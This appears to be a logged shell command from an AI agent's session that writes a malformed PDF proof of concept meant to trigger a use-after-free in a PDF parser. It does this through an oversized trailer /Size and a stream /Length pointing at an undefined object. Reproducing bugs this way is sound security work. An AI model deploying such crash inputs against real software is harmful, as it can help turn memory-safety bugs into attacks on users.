COMMAND:
cd /workspace && python3 -c "
# Create a minimal PDF that triggers the use-after-free
# Key: /Size in trailer is larger than the number of entries in xref table,
# and a stream's /Length points to an object within that range but not defined

pdf = b''

# Header
pdf += b'%PDF-1.4\n'

# Object 1: Catalog
pdf += b'1 0 obj\n'
pdf += b'<< /Type /Catalog /Pages 2 0 R >>\n'
pdf += b'endobj\n'

# Object 2: Pages
pdf += b'2 0 obj\n'
pdf += b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n'
pdf += b'endobj\n'

# Object 3: Page
pdf += b'3 0 obj\n'
pdf += b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\n'
pdf += b'endobj\n'

# Object 5: A stream with /Length pointing to object 99 (exists in size range but not in xref)
obj5_offset = len(pdf)
pdf += b'5 0 obj\n'
pdf += b'<< /Length 99 0 R >>\n'
pdf += b'stream\n'
pdf += b'\n'
pdf += b'endstream\n'
pdf += b'endobj\n'

# xref table - only defines objects 0, 1, 2, 3, 5 (NOT 99)
xref_offset = len(pdf)
pdf += b'xref\n'
pdf += b'0 6\n'
pdf += b'0000000000 65535 f \n'
pdf += b'0000000009 00000 n \n'
pdf += b'0000000058 00000 n \n'
pdf += b'0000000111 00000 n \n'
# Object 4 - free
pdf += b'0000000000 65535 f \n'
# Object 5
pdf += f'{obj5_offset:010d} 00000 n \n'.encode()

# Trailer with /Size 100 (larger than actual entries)
pdf += b'trailer\n'
pdf += b'<< /Size 100 /Root 1 0 R >>\n'

# startxref
pdf += b'startxref\n'
pdf += f'{xref_offset}\n'.encode()
pdf += b'%%EOF\n'

with open('/workspace/test_poc2.pdf', 'wb') as f:
    f.write(pdf)

print(f'PDF size: {len(pdf)} bytes')
print(f'xref at: {xref_offset}')
print(f'obj5 at: {obj5_offset}')
"
